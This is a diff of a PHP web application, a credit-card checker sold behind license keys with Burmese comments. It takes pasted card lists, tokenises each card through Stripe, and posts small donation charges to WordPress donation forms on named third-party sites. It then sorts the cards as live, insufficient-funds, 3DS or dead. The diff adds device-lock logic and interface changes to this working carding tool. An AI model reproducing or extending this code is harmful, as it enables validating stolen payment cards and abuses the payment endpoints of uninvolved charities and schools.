@@ -1,6 +1,6 @@
 <?php
 // --- 1. Session & Cookie Configuration (၇ ရက်အထိ မှတ်မိနေစေရန်) ---
-$session_lifetime = 604800; // 7 days in seconds
+$session_lifetime = 604800; 
 ini_set('session.gc_maxlifetime', $session_lifetime);
 session_set_cookie_params([
     'lifetime' => $session_lifetime,
@@ -32,16 +32,16 @@ if (isset($_GET['logout'])) {
     $all_keys = get_keys();
     $ckey = $_SESSION['user_key'];
     if (isset($all_keys[$ckey])) {
-        $all_keys[$ckey]['session_id'] = ""; // Server ပေါ်က Lock ကိုဖြုတ်သည်
+        $all_keys[$ckey]['session_id'] = ""; 
         save_keys($all_keys);
     }
-    setcookie("active_key", "", time() - 3600, "/"); // Device ပေါ်က Cookie ကိုဖျက်သည်
+    setcookie("active_key", "", time() - 3600, "/"); 
     session_destroy();
-    header("Location: index.php");
+    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
     exit;
 }
 
-// --- Login Logic (Single User Device Lock with Cookie Persistence) ---
+// --- Login Logic (Single Device Lock with Cookie Persistence) ---
 if (isset($_POST['login_key'])) {
     $input_key = trim($_POST['key']);
     $all_keys = get_keys();
@@ -52,12 +52,9 @@ if (isset($_POST['login_key'])) {
         } elseif ($all_keys[$input_key]['credits'] < 5) {
             $error = "Insufficient Credits (Min 5)!";
         } 
-        // --- တခြား Device မှာ သုံးနေသလား စစ်ဆေးခြင်း ---
-        // လက်ရှိ Device မဟုတ်ဘဲ Server မှာ session_id ရှိနေရင် တားဆီးမည်
         elseif (!empty($all_keys[$input_key]['session_id']) && $all_keys[$input_key]['session_id'] !== session_id() && $_COOKIE['active_key'] !== $input_key) {
             $error = "Key is already used by another device!";
         } else {
-            // Lock လုပ်ပြီး Browser Cookie ထဲတွင် ၇ ရက်အထိ မှတ်ထားမည်
             $all_keys[$input_key]['session_id'] = session_id();
             save_keys($all_keys);
             setcookie("active_key", $input_key, time() + 604800, "/");
@@ -67,13 +64,11 @@ if (isset($_POST['login_key'])) {
     } else { $error = "Invalid License Key!"; }
 }
 
-// --- Auto-Check & Persistence Logic (Browser ပြန်ဖွင့်လျှင် အလိုအလျောက် Login ဝင်ရန်) ---
+// --- Persistence Check (Browser ပြန်ဖွင့်လျှင် Auto-Login) ---
 if (!isset($_SESSION['logged_in']) && isset($_COOKIE['active_key'])) {
     $ckey = $_COOKIE['active_key'];
     $all_keys = get_keys();
-    
     if (isset($all_keys[$ckey]) && date('Y-m-d') <= $all_keys[$ckey]['expiry'] && $all_keys[$ckey]['credits'] >= 5) {
-        // Session ID ကို လက်ရှိ Browser နှင့် ပြန်ညှိပေးသည် (Persistence)
         $all_keys[$ckey]['session_id'] = session_id();
         save_keys($all_keys);
         $_SESSION['user_key'] = $ckey;
@@ -81,19 +76,19 @@ if (!isset($_SESSION['logged_in']) && isset($_COOKIE['active_key'])) {
     }
 }
 
-// Auto-Check Validity (အသုံးပြုနေရင်း သက်တမ်းကုန်/Credit ကုန် စစ်ဆေးရန်)
+// Auto-Check Validity
 if (isset($_SESSION['logged_in'])) {
     $ckey = $_SESSION['user_key'];
     $all_keys = get_keys();
-    if (!isset($all_keys[$ckey]) || date('Y-m-d') > $all_keys[$ckey]['expiry'] || $all_keys[$ckey]['credits'] < 5) {
+    if (!isset($all_keys[$ckey]) || date('Y-m-d') > $all_keys[$ckey]['expiry'] || $all_keys[$ckey]['credits'] < 5 || $all_keys[$ckey]['session_id'] !== session_id()) {
         session_destroy();
         setcookie("active_key", "", time() - 3600, "/");
-        header("Location: index.php");
+        header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
         exit;
     }
 }
 
-// Login Form
+// Login Form UI
 if (!isset($_SESSION['logged_in'])) {
     ?>
     <!DOCTYPE html>
@@ -113,25 +108,24 @@ if (!isset($_SESSION['logged_in'])) {
     <body><div class="login-box">
     <div class="logo-icon"><i class="fa-solid fa-bolt-lightning"></i></div>
     <h2>HEYOz LOGIN</h2>
-    <?php if(isset($error)) echo "<div class='err'>$error</div>"; ?>
-    <form method="POST"><input type="text" name="key" placeholder="Enter License Key" required><button type="submit" name="login_key">𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲 𝗔𝗰𝗰𝗲𝘀𝘀</button></form>
+    <?php if($error) echo "<div class='err'>$error</div>"; ?>
+    <form method="POST"><input type="text" name="key" placeholder="Enter License Key" required><button type="submit" name="login_key">𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇ေ 𝗔𝗰𝗰𝗲𝘀𝘀</button></form>
     </div></body></html>
     <?php exit;
 }
 
-// --- API Checker Logic ---
+// Logic ပိုင်းများ (Stripe Checker API)
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
     header("Content-Type: application/json");
     $ckey = $_SESSION['user_key'];
     $all_keys = get_keys();
-    if ($all_keys[$ckey]['credits'] < 5) {
-        echo json_encode(["status" => "LOGOUT", "msg" => "Low Credit!"]); exit;
+    if ($all_keys[$ckey]['credits'] < 5 || $all_keys[$ckey]['session_id'] !== session_id()) {
+        echo json_encode(["status" => "LOGOUT", "msg" => "Account Locked!"]); exit;
     }
-    
     $data = json_decode(file_get_contents('php://input'), true);
     $ccx = $data['card'] ?? "";
     $gate = $data['gate'] ?? "gate1"; 
-
+    
     // Formatting CC
     if (preg_match('/(\d{15,16})[\s|:|\\/]+(\d{1,2})[\s|:|\\/]+(\d{2,4})[\s|:|\\/]+(\d{3,4})/', $ccx, $matches)) {
         $cc = $matches[1]; $mes = $matches[2]; $ano = $matches[3]; $cvv = $matches[4];
@@ -143,7 +137,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
     if (strlen($mes) == 1) $mes = "0" . $mes;
     if (strlen($ano) == 4) $ano = substr($ano, 2);
 
-    // BIN Lookup
     $bin = substr($cc, 0, 6);
     $ch_bin = curl_init("https://lookup.binlist.net/" . $bin);
     curl_setopt($ch_bin, CURLOPT_RETURNTRANSFER, true);
@@ -173,7 +166,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
         $site_origin = 'https://christiantvireland.ie';
     }
 
-    // Stripe PM Creation
     $ch1 = curl_init('https://api.stripe.com/v1/payment_methods');
     curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch1, CURLOPT_POST, true);
@@ -182,12 +174,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
     $res1 = json_decode(curl_exec($ch1), true);
     $pm = $res1['id'] ?? null;
 
-    if (!$pm) { 
-        $err = $res1['error']['message'] ?? "Tokenization Restricted"; 
-        echo json_encode(["status" => "DEAD", "msg" => "$err $bin_info ( HEYOz🔥 )"]); exit; 
-    }
+    if (!$pm) { $err = $res1['error']['message'] ?? "Tokenization Restricted"; echo json_encode(["status" => "DEAD", "msg" => "$err $bin_info ( HEYOz🔥 )"]); exit; }
 
-    // Charging Logic
     if ($gate == "gate1") {
         $target = 'https://texassouthernacademy.com/wp-admin/admin-ajax.php';
         $fields = ['action' => 'wp_full_stripe_inline_donation_charge', 'wpfs-form-name' => 'donate','wpfs-form-get-parameters' => '%7B%7D', 'wpfs-custom-amount' => 'other', 'wpfs-custom-amount-unique' => '1','wpfs-donation-frequency' => 'one-time', 'wpfs-billing-name' => 'John Steve','wpfs-billing-address-country' => 'US', 'wpfs-billing-address-line-1' => '123 Wailiam street','wpfs-billing-address-city' => 'NewYork', 'wpfs-billing-address-state-select' => 'NY','wpfs-billing-address-zip' => '10038', 'wpfs-card-holder-email' => $email,'wpfs-card-holder-name' => 'John Steve', 'wpfs-stripe-payment-method-id' => $pm,];
@@ -228,63 +216,73 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
         body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; padding: 15px; margin: 0; display: flex; justify-content: center; }
         .wrapper { width: 100%; max-width: 900px; animation: fadeIn 0.8s ease; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        
         .header-flex { display: flex; justify-content: space-between; align-items: center; background: linear-gradient(90deg, #161b22, #0d1117); padding: 15px 20px; border-radius: 15px; border: 1px solid var(--border); margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
         h1 { font-size: 1.4rem; color: var(--accent); margin: 0; text-transform: uppercase; letter-spacing: 1px; }
         .credit-display { color: var(--accent); font-weight: bold; border: 1px solid rgba(88, 166, 255, 0.3); padding: 8px 18px; border-radius: 12px; font-size: 14px; background: rgba(88, 166, 255, 0.1); }
+        
         #status-display { background: #010409; border: 1px solid var(--accent); padding: 12px; border-radius: 12px; text-align: center; margin-bottom: 15px; font-family: monospace; color: var(--accent); font-weight: bold; min-height: 45px; }
+        
         .gate-select { width: 100%; background: var(--card); color: var(--accent); border: 1px solid var(--border); padding: 12px; border-radius: 10px; margin-bottom: 15px; font-weight: bold; outline: none; cursor: pointer; transition: 0.3s; }
+        
         textarea { width: 100%; height: 160px; background: #010409; color: var(--accent); border: 1px solid var(--border); padding: 15px; border-radius: 12px; font-family: monospace; resize: none; outline: none; transition: 0.3s; }
+        
         .controls { display: flex; gap: 12px; margin: 20px 0; }
         #btn { flex: 2; background: linear-gradient(45deg, #238636, #2ea043); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 1rem; transition: 0.3s; }
         #stopBtn { flex: 1; background: #da3633; color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; font-weight: bold; display: none; }
+
         .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(110px, 1fr)); gap: 12px; margin-bottom: 25px; }
         .stat-box { background: var(--card); border: 1px solid var(--border); padding: 15px; border-radius: 15px; text-align: center; transition: 0.3s; }
-        .result-box { background: var(--card); border: 1px solid var(--border); border-radius: 15px; margin-bottom: 12px; overflow: hidden; }
-        .res-head { padding: 14px 18px; font-weight: bold; font-size: 13px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.02); }
+        .stat-box small { font-size: 10px; color: #8b949e; text-transform: uppercase; display: block; margin-bottom: 5px; }
+        .stat-box span { font-size: 22px; font-weight: bold; display: block; }
+
+        .result-box { background: var(--card); border: 1px solid var(--border); border-radius: 15px; margin-bottom: 12px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+        .res-head { padding: 14px 18px; font-weight: bold; font-size: 13px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; background: rgba(255,255,255,0.02); }
         .res-body { display: none; padding: 10px; font-family: monospace; font-size: 12px; border-top: 1px solid var(--border); background: #0d1117; max-height: 300px; overflow-y: auto; }
+        
         .LIVE { color: #3fb950; } .INSUF { color: #d29922; } .CVV { color: #58a6ff; } .DEAD { color: #f85149; }
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 10px; }
     </style>
 </head>
 <body>
 <div class="wrapper">
     <div class="header-flex">
-        <h1>⚡ HEYOz PREMIUM</h1>
-        <div class="credit-display">CREDITS: <?php echo number_format(get_keys()[$_SESSION['user_key']]['credits']); ?></div>
-        <a href="?logout=1" style="color:#f85149; text-decoration:none; font-size:12px; border:1px solid #f85149; padding:5px 10px; border-radius:8px;">LOGOUT</a>
+        <h1><i class="fa-solid fa-bolt-lightning"></i> HEYOz PREMIUM</h1>
+        <div class="credit-display"><i class="fa-solid fa-coins"></i> CREDITS: <?php echo number_format(get_keys()[$_SESSION['user_key']]['credits']); ?></div>
+        <a href="?logout=1" style="color:#f85149; text-decoration:none; font-size:12px; border:1px solid #f85149; padding:5px 10px; border-radius:8px; font-weight:bold;">LOGOUT</a>
     </div>
     
-    <div id="status-display">READY TO SCAN</div>
+    <div id="status-display">SYSTEM ONLINE | READY TO SCAN</div>
 
     <select id="gate" class="gate-select">
-        <option value="gate1">🛡️ GATE 1: STRIPE $1.00</option>
-        <option value="gate2">🛡️ GATE 2: STRIPE $0.50</option>
+        <option value="gate1">🛡️ GATE 1: STRIPE $1.00 (Charge)</option>
+        <option value="gate2">🛡️ GATE 2: STRIPE $0.50 (Charge)</option>
     </select>
 
     <textarea id="list" placeholder="CC|MM|YY|CVV"></textarea>
 
     <div class="controls">
-        <button id="btn" onclick="start()"><i class="fa-solid fa-play"></i> START</button>
+        <button id="btn" onclick="start()"><i class="fa-solid fa-play"></i> START CHECKING</button>
         <button id="stopBtn" onclick="stop()"><i class="fa-solid fa-stop"></i> STOP</button>
     </div>
 
     <div class="stats">
         <div class="stat-box"><small>Total</small><span id="c_total">0</span></div>
-        <div class="stat-box"><small class="LIVE">Hit</small><span id="c_live">0</span></div>
-        <div class="stat-box"><small class="DEAD">Dead</small><span id="c_dead">0</span></div>
+        <div class="stat-box"><small class="LIVE">Hit</small><span id="c_live" class="LIVE">0</span></div>
+        <div class="stat-box"><small class="INSUF">Insuf</small><span id="c_insuf" class="INSUF">0</span></div>
+        <div class="stat-box"><small class="CVV">3Ds</small><span id="c_cvv" class="CVV">0</span></div>
+        <div class="stat-box"><small class="DEAD">Dead</small><span id="c_dead" class="DEAD">0</span></div>
     </div>
 
-    <div class="result-box">
-        <div class="res-head LIVE" onclick="toggleBox('l_live', this)"><span>HIT</span> <i class="fa-solid fa-chevron-down"></i></div>
-        <div class="res-body" id="l_live"></div>
-    </div>
-    <div class="result-box">
-        <div class="res-head DEAD" onclick="toggleBox('l_dead', this)"><span>DEAD</span> <i class="fa-solid fa-chevron-down"></i></div>
-        <div class="res-body" id="l_dead"></div>
-    </div>
+    <div class="result-box"><div class="res-head" style="color:#3fb950" onclick="toggleBox('l_live', this)"><span>HIT / CHARGED</span> <i class="fa-solid fa-chevron-down"></i></div><div class="res-body" id="l_live"></div></div>
+    <div class="result-box"><div class="res-head" style="color:#d29922" onclick="toggleBox('l_insuf', this)"><span>INSUFFICIENT FUNDS</span> <i class="fa-solid fa-chevron-down"></i></div><div class="res-body" id="l_insuf"></div></div>
+    <div class="result-box"><div class="res-head" style="color:#58a6ff" onclick="toggleBox('l_cvv', this)"><span>3Ds / CCN LIVE</span> <i class="fa-solid fa-chevron-down"></i></div><div class="res-body" id="l_cvv"></div></div>
+    <div class="result-box"><div class="res-head" style="color:#f85149" onclick="toggleBox('l_dead', this)"><span>DECLINED</span> <i class="fa-solid fa-chevron-down"></i></div><div class="res-body" id="l_dead"></div></div>
 </div>
 
 <script>
-    let counts = { LIVE: 0, DEAD: 0, INSUF: 0, CVV: 0 };
+    let counts = { LIVE: 0, INSUF: 0, CVV: 0, DEAD: 0 };
     let isRunning = false;
 
     function toggleBox(id, header) {
@@ -292,7 +290,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
         body.style.display = body.style.display === "block" ? "none" : "block";
     }
 
-    function stop() { isRunning = false; }
+    function stop() { isRunning = false; document.getElementById('stopBtn').style.display = 'none'; }
 
     async function start() {
         const textArea = document.getElementById('list');
@@ -300,9 +298,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
         if (lines.length === 0) return;
         isRunning = true;
         document.getElementById('stopBtn').style.display = 'block';
+        document.getElementById('c_total').innerText = lines.length;
 
         while (lines.length > 0 && isRunning) {
             let line = lines[0].trim();
+            document.getElementById('status-display').innerText = "Checking: " + line;
             try {
                 const res = await fetch(window.location.href, {
                     method: 'POST',
@@ -310,19 +310,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
                     headers: { 'Content-Type': 'application/json' }
                 });
                 const data = await res.json();
-                
                 if (data.status === "LOGOUT") { location.reload(); return; }
 
-                const target = document.getElementById('l_' + (data.status === "LIVE" ? "live" : "dead"));
-                const item = document.createElement('div');
-                item.innerHTML = `[${data.status}] ${line} -> ${data.msg}`;
-                target.insertBefore(item, target.firstChild);
+                counts[data.status]++;
+                const countElem = document.getElementById('c_' + data.status.toLowerCase());
+                if (countElem) countElem.innerText = counts[data.status];
 
+                const target = document.getElementById('l_' + data.status.toLowerCase());
+                if (target) {
+                    const item = document.createElement('div');
+                    item.style.padding = "10px 0"; item.style.borderBottom = "1px solid #21262d";
+                    item.innerHTML = `<span class="${data.status}">[${data.status}]</span> ${line} -> <span class="${data.status}">${data.msg}</span>`;
+                    target.insertBefore(item, target.firstChild);
+                }
+
+                if(data.status === "LIVE") { setTimeout(() => { location.reload(); }, 1500); }
                 lines.shift();
                 textArea.value = lines.join('\n');
             } catch (e) { isRunning = false; }
         }
-        isRunning = false;
+        document.getElementById('status-display').innerText = "FINISH SCANNING";
         document.getElementById('stopBtn').style.display = 'none';
     }
 </script>
